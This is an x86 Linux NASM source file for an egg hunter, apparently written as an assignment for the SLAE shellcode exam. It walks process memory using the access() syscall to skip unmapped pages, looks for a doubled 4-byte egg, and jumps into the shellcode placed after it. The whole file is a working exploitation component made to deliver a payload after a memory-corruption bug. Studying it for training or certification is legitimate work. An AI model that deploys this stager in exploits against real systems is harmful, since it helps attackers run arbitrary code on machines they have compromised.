; Filename: eggHunter.nasm
; Author:   Muhereza Herbert
; Website:  http://kilobytesecurity.com
;
; Purpose: SLAE Exam requirement Assignment Three

global _start

section .text
_start:
	; First we need to zero out the eax, ecx and edx registers and ebx=our_egg which is executable
	mov ebx,0x50905090	; The egg 
	xor ecx,ecx		; ecx=0
	mul ecx			; edx=0

	; perform a page alignment operation on the current pointer. on IA32, pAGE_SIZE=4096
	NEXT_PAGE:
	or dx,0xfff		; Validate current pointer
	VALUE:
	inc edx			; Increment memory address

	pusha			;preserve access() sys_call result onto stack
	lea ebx,[edx+0x4]	;Address being validated (*pathname)
	mov al,0x21		; access() syscall no. 0x21
	int 0x80

	cmp al,0xf2		; compare syscall return value to EFAULT which is equivalent to 0xf2
	popa			; restore the eax, abx values
	jz NEXT_PAGE		; loop to next memory page if we encountered an invalid memory address ie EFAULT
	cmp [edx],ebx		; Pointer valid, so its compared to egg being searched for
	jnz VALUE		; loop to next value if its not equal to our egg
	cmp [edx+0x4],ebx	; verify the other half for the full Egg e.g 'w00tw00t'
	jnz VALUE		; Egg not valid
	jmp edx			; Egg is valid, jump to shellcode.
